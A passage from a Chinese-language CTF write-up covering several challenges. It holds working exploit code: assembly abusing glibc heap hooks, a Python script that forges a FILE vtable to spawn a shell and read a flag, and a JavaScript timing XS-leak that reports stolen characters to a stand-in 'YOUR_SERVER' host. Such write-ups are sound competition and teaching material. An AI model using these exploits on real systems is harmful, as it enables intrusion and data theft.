+    movq $2, %rax
+    leaq str_d(%rip), %rdi
+    movq $0x80, %rsi
+    syscall # open(str_d, 0x80) = 7
+
+    movq $2, %rax
+    leaq str_e(%rip), %rdi
+    movq $0x80, %rsi
+    syscall # open(str_e, 0x80) = 8
+
+    movq $2, %rax
+    leaq str24_d(%rip), %rdi
+    movq $0x110, %rsi
+    syscall # open(str24_d, 0x110) = 9
+
+    movq $3, %rax
+    movq $7, %rdi
+    syscall # close(7)
+
+    movq $3, %rax
+    movq $8, %rdi
+    syscall # close(8)
+
+    xorq %rax, %rax
+    movq $9, %rdi
+    leaq buf_2(%rip), %rsi
+    movq $0x110, %rdx
+    syscall # read(9, buf_2, 0x110)
+
+    movq buf_1 + 0x40(%rip), %rax  # &lt;main_arena+1632&gt;
+    addq $0x2948, %rax             # &lt;__free_hook&gt;
+    movq %rax, buf_2 + 0x60(%rip)  # tcache_entry::next
+
+    movq $1, %rax
+    movq $9, %rdi
+    leaq buf_2(%rip), %rsi
+    movq $0x110, %rdx
+    syscall # write(9, buf_2, 0x110)
+
+    movq $2, %rax
+    leaq str_d(%rip), %rdi
+    movq $0x80, %rsi
+    syscall # open(str_d, 0x80) = 7
+
+    movq $2, %rax
+    leaq str_e(%rip), %rdi
+    movq $0x80, %rsi
+    syscall # open(str_e, 0x80) = 8
+
+    movq buf_1 + 0x40(%rip), %rax  # &lt;main_arena+1632&gt;
+    addq $-0xc0b1e0, %rax          # rwx memory
+    movq %rax, buf_2(%rip)
+
+    movq $1, %rax
+    movq $8, %rdi
+    leaq buf_2(%rip), %rsi
+    movq %rdi, %rdx
+    syscall # write(8, buf_2, 8)
+
+    movq $3, %rax
+    movq $7, %rdi
+    syscall # close(7)
+
+str24_a: .ascii &quot;aaaaaaaaaaaaaaaaaaaaaaa&quot;
+str_a: .string &quot;a&quot;
+str_b: .string &quot;b&quot;
+str_c: .string &quot;c&quot;
+
+str24_d: .ascii &quot;ddddddddddddddddddddddd&quot;
+str_d: .string &quot;d&quot;
+str_e: .string &quot;e&quot;
+
+buf_1: .skip 0x110
+buf_2: .skip 0x110
+
+
+_bootstrap:
+    movq addr_src_p(%rip), %rsi
+    movq (%rsi), %rsi
+    movq addr_dest(%rip), %rdi
+    movq $0x5000, %rcx
+    rep
+    movsb
+
+    movq addr_dest(%rip), %rax
+    addq $(main - _start), %rax
+    jmp *%rax
+
+addr_src_p: .quad 0x0
+addr_dest: .quad 0x0
+
+
+main:
+    movq $257, %rax
+    movq $-100, %rdi
+    leaq dot(%rip), %rsi
+    movq $0x90800, %rdx
+    syscall # fd = openat(AT_FDCWD, &quot;.&quot;, O_RDONLY|O_NONBLOCK|O_CLOEXEC|O_DIRECTORY)
+
+    movq %rax, %rdi
+    movq $217, %rax
+    leaq dents(%rip), %rsi
+    movq $32768, %rdx
+    syscall # getdents64(fd, dents, 32768)
+
+    movq $1, %rax
+    movq %rax, %rdi
+    leaq dents(%rip), %rsi
+    movq $32768, %rdx
+    syscall # write(1, dents, 32768)
+
+    movq $2, %rax
+    leaq flag_name(%rip), %rdi
+    xorq %rsi, %rsi
+    syscall # fd = open(&quot;flag&quot;, O_RDONLY)
+
+    movq %rax, %rdi
+    xorq %rax, %rax
+    leaq flag_content(%rip), %rsi
+    movq $32768, %rdx
+    syscall # read(fd, flag_content, 32768)
+
+    movq $1, %rax
+    movq %rax, %rdi
+    leaq flag_content(%rip), %rsi
+    movq $32768, %rdx
+    syscall # write(1, flag_contents, 32768)
+
+dot: .string &quot;.&quot;
+flag_name: .string &quot;flag&quot;
+dents:
+flag_content:
+</code></pre><h2 id="pwn-nemu">[pwn] nemu</h2>
+<p>&#x9898;&#x76EE;&#x5927;&#x610F;&#xFF1A;&#x53C8;&#x662F;&#x4E00;&#x4E2A;x86&#x6A21;&#x62DF;&#x5668;&#xFF0C;&#x7ED9;&#x51FA;&#x4E86;&#x5168;&#x90E8;&#x6E90;&#x4EE3;&#x7801;&#xFF0C;&#x8BE5;&#x6A21;&#x62DF;&#x5668;&#x7684;&#x8C03;&#x8BD5;&#x90E8;&#x5206;&#x8FDB;&#x884C;&#x5185;&#x5B58;&#x5199;&#x5165;&#x65F6;&#x672A;&#x68C0;&#x67E5;&#x88AB;&#x504F;&#x79FB;&#x540E;&#x7684;&#x5185;&#x5B58;&#x5730;&#x5740;&#x662F;&#x5426;&#x5408;&#x6CD5;&#xFF0C;&#x76EE;&#x6807;&#x53CD;&#x5F39;shell&#xFF0C;&#x6CA1;&#x5F00;PIE&#xFF0C;glibc2.23</p>
+<p>&#x867D;&#x7136;&#x5185;&#x5B58;&#x5730;&#x5740;&#x504F;&#x79FB;&#x540E;&#x6CA1;&#x6709;&#x505A;&#x4EFB;&#x4F55;&#x68C0;&#x67E5;&#xFF0C;&#x4F46;&#x56E0;&#x4E3A;&#x8FD9;&#x91CC;&#x504F;&#x79FB;&#x91CF;&#x662F;32&#x4F4D;&#x7684;&#xFF0C;&#x6240;&#x4EE5;&#x5B9E;&#x9645;&#x4E0A;&#x4E0D;&#x662F;&#x201C;&#x4EFB;&#x610F;&#x4F4D;&#x7F6E;&#x201D;&#x5185;&#x5B58;&#x5199;&#x5165;&#xFF0C;&#x53EA;&#x80FD;&#x5199;&#x5165;&#x5168;&#x5C40;&#x53D8;&#x91CF;&#x7684;&#x540E;&#x534A;&#x90E8;&#x5206;&#x548C;&#x5806;</p>
+<p>&#x626B;&#x4E86;&#x4E00;&#x904D;&#x5168;&#x5C40;&#x53D8;&#x91CF;&#x7684;&#x540E;&#x534A;&#x90E8;&#x5206;&#x90FD;&#x6709;&#x5565;&#xFF0C;&#x53D1;&#x73B0;&#x4E1C;&#x897F;&#x5C11;&#x5F97;&#x53EF;&#x601C;&#xFF0C;&#x800C;&#x4E14;&#x6CA1;&#x6709;&#x76F4;&#x63A5;&#x7684;&#x51FD;&#x6570;&#x6307;&#x9488;&#xFF0C;&#x6700;&#x5F00;&#x59CB;&#x4EE5;&#x4E3A;&#x662F;&#x8BFB;&#x53D6;&#x7528;&#x6237;&#x8F93;&#x5165;&#x7684;linebuf&#xFF0C;&#x5B83;&#x53EF;&#x4EE5;&#x6CC4;&#x6F0F;&#x5806;&#x5730;&#x5740;&#xFF0C;&#x7136;&#x540E;&#x4FEE;&#x6539;&#x5806;&#x4E0A;&#x6570;&#x636E;&#xFF0C;&#x518D;&#x6B21;&#x7C7B;&#x4F3C;&#x4E86;&#x524D;&#x4E24;&#x9053;pwn&#x9898;&#x76EE;&#xFF1B;&#x4E0D;&#x8FC7;&#x540E;&#x6765;&#x6CA1;&#x641E;&#x51FA;&#x6765;&#xFF0C;&#x56E0;&#x4E3A;&#x53D1;&#x73B0;&#x8FD9;&#x9053;&#x9898;&#x7684;&#x5806;&#x6570;&#x636E;&#x6BD4;&#x8F83;&#x968F;&#x673A;&#xFF0C;&#x7279;&#x522B;&#x662F;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x7684;&#x5806;&#x7ED3;&#x6784;&#x548C;&#x672C;&#x673A;&#x7684;&#x5806;&#x7ED3;&#x6784;&#x5B8C;&#x5168;&#x4E0D;&#x540C;&#xFF0C;&#x63A8;&#x6D4B;&#x662F;&#x56E0;&#x4E3A;libreadline.so.6&#x6CA1;&#x6709;&#x4E0B;&#x53D1;&#x7684;&#x7F18;&#x6545;&#xFF08;&#x4E0D;&#x786E;&#x5B9A;&#xFF0C;&#x4E5F;&#x53EF;&#x80FD;&#x662F;&#x5176;&#x4ED6;&#x539F;&#x56E0;&#xFF09;&#xFF0C;&#x6700;&#x540E;&#x653E;&#x5F03;&#x4E86;&#x8FD9;&#x6761;&#x601D;&#x8DEF;</p>
+<p>&#x6700;&#x540E;&#x5B9A;&#x4F4D;&#x5230;&#x4E00;&#x4E2A;&#x7528;&#x4E8E;&#x8BB0;&#x5F55;&#x65E5;&#x5FD7;&#x7684;FILE&#x6307;&#x9488;log_fp&#xFF0C;&#x867D;&#x7136;&#x9ED8;&#x8BA4;&#x662F;&#x7A7A;&#x7684;&#x4F46;&#x662F;&#x53EF;&#x4EE5;&#x9020;&#x4E00;&#x4E2A;&#x5047;&#x7684;&#xFF0C;&#x800C;&#x4E14;&#x8FD9;&#x91CC;glibc&#x7248;&#x672C;&#x592A;&#x8001;&#x51E0;&#x4E4E;&#x6CA1;&#x6709;&#x4EFB;&#x4F55;&#x5B89;&#x5168;&#x68C0;&#x67E5;&#xFF0C;FILE&#x7ED3;&#x6784;&#x4F53;&#x4E2D;&#x7684;&#x51FD;&#x6570;&#x6307;&#x9488;&#x8868;vtable&#x53EF;&#x4EE5;&#x968F;&#x610F;&#x8BBE;&#x7F6E;&#xFF0C;&#x8BA9;&#x5B83;&#x6307;&#x5411;system&#x5373;&#x53EF;</p>
+<p>&#x6700;&#x540E;&#x4E00;&#x4E2A;&#x95EE;&#x9898;&#x5C31;&#x662F;&#x600E;&#x4E48;&#x83B7;&#x53D6;system&#x5730;&#x5740;&#xFF0C;&#x5168;&#x5C40;&#x53D8;&#x91CF;&#x533A;&#x57DF;&#x6CA1;&#x6709;&#x53EF;&#x7528;&#x4FE1;&#x606F;&#xFF0C;&#x53EA;&#x80FD;&#x4ECE;&#x5806;&#x91CC;&#x627E;&#x529E;&#x6CD5;&#xFF0C;&#x4F46;&#x662F;&#x524D;&#x9762;&#x63D0;&#x5230;&#x4E86;&#x5806;&#x7ED3;&#x6784;&#x672C;&#x5730;&#x548C;&#x670D;&#x52A1;&#x5668;&#x5B8C;&#x5168;&#x4E0D;&#x540C;&#xFF0C;&#x6700;&#x540E;&#x6211;&#x91C7;&#x53D6;&#x7684;&#x65B9;&#x6CD5;&#x662F;&#x901A;&#x8FC7;&#x8F83;&#x957F;&#x7684;&#x8F93;&#x5165;&#xFF0C;&#x5F3A;&#x5236;&#x5206;&#x914D;&#x4E00;&#x5757;&#x6BD4;&#x8F83;&#x5927;&#x7684;&#x8F93;&#x5165;&#x7F13;&#x51B2;&#x533A;&#xFF0C;&#x968F;&#x540E;&#x5F53;&#x5B83;&#x91CA;&#x653E;&#x6389;&#x540E;&#x8BFB;&#x53D6;glibc&#x586B;&#x5145;&#x7684;bk/fd&#x6307;&#x9488;&#x5F97;&#x5230;main_arena&#x9644;&#x8FD1;&#x7684;&#x5730;&#x5740;&#xFF0C;&#x4E0D;&#x8FC7;&#x8FD8;&#x662F;&#x53D1;&#x73B0;&#x6709;&#x4E9B;&#x8F93;&#x5165;&#x957F;&#x5EA6;&#x672C;&#x673A;&#x7ED3;&#x6784;&#x548C;&#x670D;&#x52A1;&#x5668;&#x7ED3;&#x679C;&#x4E0D;&#x4E00;&#x81F4;&#xFF0C;&#x597D;&#x5728;&#x591A;&#x8BD5;&#x4E86;&#x51E0;&#x4E2A;&#x8F93;&#x5165;&#x957F;&#x5EA6;&#x540E;&#x53D1;&#x73B0;&#x4E86;&#x4E00;&#x6B21;&#x7ED3;&#x679C;&#x4E00;&#x81F4;&#xFF0C;&#x7ED3;&#x675F;</p>
+<p>pwn&#x811A;&#x672C;&#xFF1A;</p>
+<pre><code class="lang-python"><span class="hljs-keyword">import</span> sys
+<span class="hljs-keyword">import</span> time
+
+print(<span class="hljs-string">&apos;x 0x8000b60&apos;</span> + <span class="hljs-string">&apos; &apos;</span> * <span class="hljs-number">555</span>)
+sys.stdout.flush()
+
+off = int(input(), <span class="hljs-number">16</span>) - <span class="hljs-number">0x6a3b80</span>
+print(<span class="hljs-string">&apos;x 20 &apos;</span> + hex(off - <span class="hljs-number">0x10</span>))
+sys.stdout.flush()
+
+hi = int(input(), <span class="hljs-number">16</span>)
+lo = int(input(), <span class="hljs-number">16</span>)
+addr = hi * (<span class="hljs-number">2</span> ** <span class="hljs-number">32</span>) + lo <span class="hljs-comment"># &lt;main_arena+760&gt;</span>
+addr += <span class="hljs-number">-0x37fa08</span>          <span class="hljs-comment"># &lt;__libc_system&gt;</span>
+hi = addr // (<span class="hljs-number">2</span> ** <span class="hljs-number">32</span>)
+lo = addr % (<span class="hljs-number">2</span> ** <span class="hljs-number">32</span>)
+
+print(<span class="hljs-string">&apos;set 0x400088 0x8a3b80&apos;</span>)   <span class="hljs-comment"># log_fp-&gt;_lock = &amp;pmem[0x200000]</span>
+sys.stdout.flush()
+time.sleep(<span class="hljs-number">1</span>)
+
+print(<span class="hljs-string">&apos;set 0x4000d8 0x9a3b80&apos;</span>)   <span class="hljs-comment"># log_fp-&gt;vtable = &amp;pmem[0x300000]</span>
+sys.stdout.flush()
+time.sleep(<span class="hljs-number">1</span>)
+
+print(<span class="hljs-string">&apos;set 0x400000 0x6e69622f&apos;</span>) <span class="hljs-comment"># &quot;/bin&quot;</span>
+sys.stdout.flush()
+time.sleep(<span class="hljs-number">1</span>)
+
+print(<span class="hljs-string">&apos;set 0x400004 0x0068732f&apos;</span>) <span class="hljs-comment"># &quot;/sh\0&quot;</span>
+sys.stdout.flush()
+time.sleep(<span class="hljs-number">1</span>)
+
+print(<span class="hljs-string">&apos;set 0x300060 &apos;</span> + hex(lo))
+sys.stdout.flush()
+time.sleep(<span class="hljs-number">1</span>)
+
+print(<span class="hljs-string">&apos;set 0x300064 &apos;</span> + hex(hi))
+sys.stdout.flush()
+time.sleep(<span class="hljs-number">1</span>)
+
+print(<span class="hljs-string">&apos;set 0x8000018 0xaa3b80&apos;</span>)  <span class="hljs-comment"># log_fp = &amp;pmem[0x400000]</span>
+sys.stdout.flush()
+time.sleep(<span class="hljs-number">1</span>)
+
+print(<span class="hljs-string">&apos;c&apos;</span>)
+sys.stdout.flush()
+time.sleep(<span class="hljs-number">1</span>)
+
+print(<span class="hljs-string">&apos;ls&apos;</span>)
+sys.stdout.flush()
+time.sleep(<span class="hljs-number">1</span>)
+
+print(<span class="hljs-string">&apos;cat flag&apos;</span>)
+sys.stdout.flush()
+time.sleep(<span class="hljs-number">1</span>)
+</code></pre>
+<h2 id="misc-nanomaze">[misc] Nanomaze</h2>
+<p>nc &#x624B;&#x73A9;&#x4E00;&#x4E0B;&#xFF0C;&#x53D1;&#x73B0;&#x8FD9;&#x662F;&#x4E00;&#x6B3E; <strong>&#x514D;&#x8D39;&#x7684;&#x4E8C;&#x6B21;&#x5143;&#x5F00;&#x653E;&#x4E16;&#x754C;&#x5192;&#x9669;&#x6E38;&#x620F;</strong> &#x5927;&#x4F5C;&#x3002;</p>
+<p>&#x5199;&#x4E2A;&#x968F;&#x673A;&#x6E38;&#x8D70;&#x7684;&#x811A;&#x672C;&#xFF0C;&#x628A;&#x5730;&#x56FE;&#x6253;&#x5370;&#x51FA;&#x6765;&#xFF0C;&#x53EF;&#x4EE5;&#x6CE8;&#x610F;&#x5230;&#x5730;&#x56FE;&#x662F;&#x56FA;&#x5B9A;&#x7684;&#xFF0C;&#x4F46;&#x521D;&#x59CB;&#x6A2A;&#x5750;&#x6807;&#x968F;&#x673A;&#xFF0C;&#x6BCF;&#x6B21;&#x5F00;&#x5C40;&#x5F80;&#x53F3;&#x9876;&#x5230;&#x5934;&#x518D;&#x5F80;&#x4E0A;&#x9876;&#x5230;&#x5934;&#x8FD9;&#x6837;&#x5C31;&#x5B8C;&#x5168;&#x56FA;&#x5B9A;&#x4E86;&#x3002;</p>
+<p>&#x7EE7;&#x7EED;&#x624B;&#x73A9;&#x53D1;&#x73B0;&#x6709;&#x53EF;&#x4EE5;&#x5355;&#x5411;&#x901A;&#x884C;&#x7684;&#x673A;&#x5173;&#xFF08;click&#xFF09;&#xFF0C;&#x7136;&#x540E;&#x7EE7;&#x7EED;&#x73A9;&#x73A9;&#x76F4;&#x5230;&#x901A;&#x5173;&#x5C31;&#x884C;&#x3002;</p>
+<pre><code class="lang-python3"># coding: utf-8
+
+# In[1325]:
+
+
+from __future__ import print_function, division
+import numpy as np
+import matplotlib as mpl
+import matplotlib.pyplot as plt
+from matplotlib.ticker import MultipleLocator
+get_ipython().run_line_magic(&apos;matplotlib&apos;, &apos;inline&apos;)
+import pdb
+
+
+# In[1334]:
+
+
+plt.rcParams[&quot;figure.figsize&quot;] = (12, 12)
+
+
+# In[1236]:
+
+
+import random
+from pwn import remote
+from tqdm.notebook import tqdm
+from IPython.display import clear_output
+import pickle
+
+
+# In[1247]:
+
+
+def real_move(r, cmd, n_wait):
+    r.sendline(cmd.encode())
+    for _ in range(n_wait):
+        b = r.recvuntil(b&apos;&gt;&apos;).decode()
+        clk = &apos;[click]&apos; in b
+        if &apos;{&apos; in b:
+            print(&apos;!!&apos;, b)
+            pdb.set_trace()
+        #print(b)
+        if &apos;Cannot be moved&apos; in b:
+            yield None, clk
+        elif &apos;Moved forward&apos; in b:
+            yield float(b.partition(&apos;Moved forward &apos;)[2].partition(&apos;\n&apos;)[0]), clk
+        else:
+            print(b)
+            1/0
+
+
+# In[1223]:
+
+
+REMOTE_ARGS = [&apos;120.79.184.2&apos;, 49808]
+
+
+# In[1219]:
+
+
+#hist_points = []
+#hist_clicks = []
+with open(&apos;hist.pickle&apos;, &apos;rb&apos;) as f:
+    hist_points, hist_clicks = pickle.load(f)
+
+
+# In[1358]:
+
+
+class Bot:
+
+    def __init__(self):
+        self.points = []
+        self.clicks = []
+        self.x = 0
+        self.y = 0
+
+        self.r = remote(*REMOTE_ARGS)
+        self.r.recvuntil(b&apos;&gt;&apos;)
+
+        self._back_to_zero()
+
+    def _back_to_zero(self):
+        last_x = self.x
+        while True:
+            self.micromove(&apos;d&apos;*25, False)
+            print(&apos;move back to zero&apos;, self.x, last_x)
+            if self.x-last_x&lt;=2:
+                break
+            last_x = self.x
+        self.micromove(&apos;d&apos;*10+&apos;w&apos;*15)
+
+        max_y = max([x[0] for x in self.points])
+        max_x = max([x[1] for x in self.points])
+        self.y -= max_y
+        self.x -= max_x
+        self.points = [[y-max_y, x-max_x] for y, x in self.points]
+        self.clicks = []
+
+        self.x = self.x%75
+
+        #hist_points.extend(self.points)
+
+    def _update(self, cmds, rets, write_hist):
+        for idx, cmd in enumerate(cmds):
+            delta, clk = rets[idx]
+            dy = {&apos;w&apos;: 1, &apos;s&apos;: -1, &apos;a&apos;: 0, &apos;d&apos;: 0}[cmd]
+            dx = {&apos;w&apos;: 0, &apos;s&apos;: 0, &apos;a&apos;: -1, &apos;d&apos;: 1}[cmd]
+
+            if delta is not None:
+                self.y += dy*delta
+                self.x += dx*delta
+                self.x = self.x%75
+
+            self.points.append([self.y, self.x])
+            if write_hist:
+                hist_points.append([self.y, self.x])
+
+            if clk:
+                self.clicks.append([self.y, self.x])
+                if write_hist:
+                    hist_clicks.append([self.y, self.x])
+
+    def move(self, cmds, write_hist):
+        rets = list(real_move(self.r, &apos;\n&apos;.join(cmds), len(cmds)))
+        self._update(cmds, rets, write_hist)
+
+    def macromove(self, d, write_hist=True):
+        d = &apos;&apos;.join([c for c in d if c in &apos;wasd&apos;])
+        self.move([random.choice(&apos;wsad&apos;*2+d*4) for _ in range(50)], write_hist)
+
+    def micromove(self, d, write_hist=True):
+        self.move(d, write_hist)
+
+    def moveuntil(self, d, value):
+        print(&apos;&gt; moveuntil&apos;, d, value)
+        if d==&apos;w&apos;:
+            pred = lambda: self.y&gt;value
+        elif d==&apos;s&apos;:
+            pred = lambda: self.y&lt;value
+        elif d==&apos;a&apos;:
+            pred = lambda: self.x&lt;value
+        elif d==&apos;d&apos;:
+            pred = lambda: self.x&gt;value
+        else:
+            1/0
+
+        for _ in range(200):
+            self.move(d, True)
+            if pred():
+                print(&apos; done&apos;, self.y, self.x)
+                return
+
+        1/0
+
+
+# In[1331]:
+
+
+def draw(self):
+    plt.axis(&apos;equal&apos;)
+    plt.ylim(-75, 5)
+    plt.xlim(-5, 80)
+
+    plt.scatter([x[1]%75 for x in hist_points], [x[0] for x in hist_points], s=1, c=&apos;g&apos;)
+
+    plt.scatter([x[1]%75 for x in self.points], [x[0] for x in self.points], s=1, c=&apos;k&apos;)
+
+    plt.scatter([x[1]%75 for x in hist_clicks], [x[0] for x in hist_clicks], s=15, c=&apos;#ffff00&apos;)
+    plt.scatter([x[1]%75 for x in self.clicks], [x[0] for x in self.clicks], s=15, c=&apos;#ffff00&apos;)
+
+    plt.scatter([self.x%75], [self.y], s=10, c=&apos;r&apos;)
+    plt.yticks(np.arange(-70, 10, 5))
+    plt.xticks(np.arange(0, 80, 5))
+    plt.minorticks_on()
+    plt.grid(&apos;both&apos;)
+    plt.show()
+
+
+# In[1367]:
+
+
+def quickstart():
+    b.moveuntil(&apos;a&apos;, 3)
+    b.moveuntil(&apos;s&apos;, -5.1)
+    b.moveuntil(&apos;d&apos;, 18.1)
+    b.moveuntil(&apos;s&apos;, -8.1)
+    b.moveuntil(&apos;d&apos;, 21.1)
+    b.moveuntil(&apos;s&apos;, -17.1)
+    b.moveuntil(&apos;d&apos;, 26.1)
+    b.moveuntil(&apos;w&apos;, -8.9)
+    b.moveuntil(&apos;d&apos;, 31.1)
+    b.moveuntil(&apos;s&apos;, -12.1)
+    b.moveuntil(&apos;d&apos;, 35.1)
+    b.moveuntil(&apos;s&apos;, -17.1)
+    b.moveuntil(&apos;d&apos;, 44.1)
+    b.moveuntil(&apos;w&apos;, -6.1)
+    b.moveuntil(&apos;d&apos;, 57)
+    b.moveuntil(&apos;s&apos;, -24)
+    b.moveuntil(&apos;a&apos;, 54)
+    b.moveuntil(&apos;s&apos;, -27.5)
+    b.moveuntil(&apos;a&apos;, 45)
+    b.moveuntil(&apos;s&apos;, -33)
+    b.moveuntil(&apos;d&apos;, 49)
+    b.moveuntil(&apos;s&apos;, -40)
+    b.moveuntil(&apos;a&apos;, 36.9)
+    b.moveuntil(&apos;w&apos;, -36)
+    b.moveuntil(&apos;a&apos;, 26.9)
+    b.moveuntil(&apos;s&apos;, -38.1)
+    b.moveuntil(&apos;a&apos;, 13.9)
+    b.moveuntil(&apos;w&apos;, -32.9)
+    b.moveuntil(&apos;a&apos;, 8)
+    b.moveuntil(&apos;s&apos;, -38.1)
+    b.moveuntil(&apos;a&apos;, 1)
+    b.moveuntil(&apos;s&apos;, -43.1)
+    b.moveuntil(&apos;d&apos;, 30)
+
+
+# In[1377]:
+
+
+b = Bot()
+quickstart()
+print(&apos;DONE&apos;)
+
+
+# In[1378]:
+
+
+for _ in range(100):
+    b.r.sendline(b&apos;d&apos;)
+b.r.stream()
+
+
+# In[1366]:
+
+
+while True:
+    c = input(&apos;&gt; &apos;)
+    clear_output(wait=True)
+    if len(c)==0:
+        break
+    if c.startswith(&apos; &apos;):
+        b.micromove(c[1:])
+    else:
+        b.macromove(c)
+    draw(b)
+
+
+# In[1379]:
+
+
+draw(b)
+
+
+# In[1218]:
+
+
+with open(&apos;hist.pickle&apos;, &apos;wb&apos;) as f:
+    pickle.dump([hist_points, hist_clicks], f)
+</code></pre>
+<h2 id="web-a-more-secure-pastebin">[web] A More Secure Pastebin</h2>
+<p>&#x770B;&#x63D0;&#x793A;&#x8BF4; timeless&#xFF0C;&#x627E;&#x5230; <a href="https://www.usenix.org/system/files/sec20-van_goethem.pdf" target="_blank">&#x4E00;&#x7BC7;&#x8BBA;&#x6587;</a>&#xFF0C;&#x8BF4;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x54CD;&#x5E94;&#x5148;&#x540E;&#x987A;&#x5E8F; leak &#x4FE1;&#x606F;&#x3002;</p>
+<p>&#x7136;&#x540E;&#x5C31;&#x641E;&#x4E2A;&#x811A;&#x672C;&#x6253;&#xFF1A;</p>
+<pre><code class="lang-javascript"><span class="hljs-keyword">const</span> SEARCH_URL = <span class="hljs-string">&apos;https://proxy:443/admin/searchword?word=&apos;</span>;
+<span class="hljs-comment">//const SEARCH_URL = &apos;https://120.25.209.67:11001/user/searchword?word=&apos;;</span>
+
+<span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">search_req</span>(<span class="hljs-params">term</span>) </span>{
+    <span class="hljs-keyword">let</span> href = SEARCH_URL+<span class="hljs-built_in">encodeURIComponent</span>(term);
+    <span class="hljs-keyword">await</span> fetch(href, {
+        mode: <span class="hljs-string">&quot;no-cors&quot;</span>,
+        credentials: <span class="hljs-string">&quot;include&quot;</span>
+    });
+    <span class="hljs-keyword">return</span> term;
+}
+
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sleep</span>(<span class="hljs-params">ms</span>) </span>{
+    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Promise</span>((r)=&gt;setTimeout(r, ms));
+}
+
+<span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">report</span>(<span class="hljs-params">msg</span>) </span>{
+    <span class="hljs-built_in">console</span>.log(msg);
+    <span class="hljs-keyword">await</span> fetch(<span class="hljs-string">&apos;https://YOUR_SERVER/?&apos;</span>+<span class="hljs-built_in">encodeURIComponent</span>(msg), {
+        mode: <span class="hljs-string">&quot;no-cors&quot;</span>,
+    });
+}
+
+<span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">timing</span>(<span class="hljs-params">term</span>) </span>{
+    <span class="hljs-keyword">let</span> cnt = <span class="hljs-number">0</span>;
+    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">20</span>; i++) {
+        <span class="hljs-keyword">let</span> ps = [search_req(term), search_req(<span class="hljs-string">&apos;_404_404_404_pcmx&apos;</span>)];
+        <span class="hljs-keyword">let</span> val = <span class="hljs-keyword">await</span> <span class="hljs-built_in">Promise</span>.any(ps);
+        <span class="hljs-keyword">if</span>(val===term) cnt++;
+        <span class="hljs-keyword">await</span> <span class="hljs-built_in">Promise</span>.all(ps);
+        <span class="hljs-keyword">await</span> sleep(<span class="hljs-number">25</span>);
+    }
+    <span class="hljs-keyword">return</span> cnt;
+}
+
+<span class="hljs-keyword">const</span> CHARSET = <span class="hljs-string">&apos;0123456789abcdef}&apos;</span>;
+<span class="hljs-comment">//const CHARSET = &apos;012}&apos;;</span>
+
+<span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">run</span>(<span class="hljs-params">pfx</span>) </span>{
+    <span class="hljs-keyword">await</span> report(<span class="hljs-string">`started_<span class="hljs-subst">${pfx}</span>`</span>);
+    <span class="hljs-keyword">let</span> res = [];
+    <span class="hljs-keyword">let</span> mi = <span class="hljs-number">1000</span>;
+    <span class="hljs-keyword">let</span> michar = <span class="hljs-string">&apos;}&apos;</span>;
+    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> idx=<span class="hljs-number">0</span>; idx&lt;CHARSET.length; idx++) {
+        <span class="hljs-keyword">let</span> r = <span class="hljs-keyword">await</span> timing(<span class="hljs-string">&apos;TF{&apos;</span>+pfx+CHARSET[idx]);
+        res.push(r);
+        <span class="hljs-keyword">if</span>(r&lt;mi) {
+            mi = r;
+            michar = CHARSET[idx];
+        }
+    }
+    <span class="hljs-keyword">await</span> report(<span class="hljs-string">`res_<span class="hljs-subst">${res.join(&apos;_&apos;)}</span>`</span>);
+    <span class="hljs-keyword">if</span>(michar!==<span class="hljs-string">&apos;}&apos;</span> &amp;&amp; pfx.length&lt;=<span class="hljs-number">8</span>)
+        <span class="hljs-keyword">await</span> run(pfx+michar);
+    <span class="hljs-keyword">else</span>
+        <span class="hljs-keyword">await</span> report(<span class="hljs-string">`done_<span class="hljs-subst">${pfx}</span>`</span>)
+}
+
+run(<span class="hljs-string">&apos;&apos;</span>);
+</code></pre>
+<p>&#x6CE8;&#x610F;&#x5230;&#x6709;&#x4E2A;&#x5F88;&#x5751;&#x7684;&#x5730;&#x65B9;&#x662F; admin session &#x8FC7;&#x671F;&#x65F6;&#x95F4; 6 &#x5206;&#x949F;&#xFF0C;&#x8D85;&#x8FC7;&#x8FD9;&#x4E2A;&#x65F6;&#x95F4;&#x5C31;&#x5BC4;&#x4E86;&#xFF0C;&#x7ED9;&#x7237;&#x5751;&#x4E86;&#x4E00;&#x4E0B;&#x5348;&#x3002;</p>
+<p>&#x53EF;&#x4EE5;&#x6BCF;&#x6B21;&#x8BD5;&#x51FA;&#x4E24;&#x4E09;&#x4E2A;&#x5B57;&#x7B26;&#xFF0C;&#x7136;&#x540E;&#x591A;&#x8DD1;&#x51E0;&#x6B21;&#x3002;&#x8DD1;&#x51FA;&#x6765;&#x7684;&#x6700;&#x540E;&#x4E00;&#x4E2A;&#x5B57;&#x7B26;&#x597D;&#x50CF;&#x7ED3;&#x679C;&#x975E;&#x5E38;&#x4E0D;&#x663E;&#x8457;&#xFF0C;&#x61D2;&#x5F97;&#x518D;&#x8DD1;&#x4E00;&#x6B21;&#x4E86;&#xFF0C;&#x53CD;&#x6B63;&#x6BCF; 5 &#x79D2;&#x5C31;&#x80FD;&#x4EA4;&#x4E00;&#x6B21; Flag&#xFF0C;&#x5C31;&#x4ECE; 0 &#x8BD5;&#x5230; f&#xFF0C;&#x7ED3;&#x679C;&#x662F; f&#xFF0C;&#x6211;&#x76F4;&#x547C;&#x597D;&#x5BB6;&#x4F19;&#x3002;</p>
+<h2 id="web-simple-php">[web] Simple PHP</h2>
